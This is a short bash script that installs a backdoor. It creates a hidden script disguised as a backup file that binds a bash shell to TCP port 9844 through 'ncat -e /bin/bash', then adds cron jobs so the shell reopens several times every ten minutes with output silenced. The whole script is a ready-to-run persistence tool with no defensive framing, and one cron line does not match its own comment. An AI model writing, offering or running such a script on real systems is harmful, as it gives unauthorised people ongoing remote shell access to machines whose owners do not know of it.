SCRIPT=.backup_bk.sh
PORT=9844
IDLE_TIME=10 # seconds


## SCRIPT
echo "Creating script that binds a shell to port $PORT"
touch $SCRIPT
chmod u+x $SCRIPT

# write the script
# opens a port with ncat for a certain time
cat << EOF > $SCRIPT
ncat -l $PORT -i $IDLE_TIME -v -e /bin/bash
EOF


## INSTALL CRON
# create cronjob to activate the script in certain interals:
# repeats every 10 minutes, during those 10min the pattern is:
# at minute: 0, 2, 3, 6, 8

echo "10 * * * * $HOME/$SCRIPT > /dev/null 2>&1" >> tmpcron
echo "2-59/10 * * * * $HOME/$SCRIPT > /dev/null 2>&1" >> tmpcron
echo "3-59/10 * * * * $HOME/$SCRIPT > /dev/null 2>&1" >> tmpcron
echo "6-59/10 * * * * $HOME/$SCRIPT > /dev/null 2>&1" >> tmpcron
echo "8-59/10 * * * * $HOME/$SCRIPT > /dev/null 2>&1" >> tmpcron

# Check if cronjob already installed
if crontab -l | grep -q $SCRIPT ; then
	echo "Crontab for $SCRIPT already installed, skipping"
else
	echo "Installing cronjobs"
	crontab -l >> tmpcron # make sure old cronjobs are kept
	crontab < tmpcron
fi

rm -rf tmpcron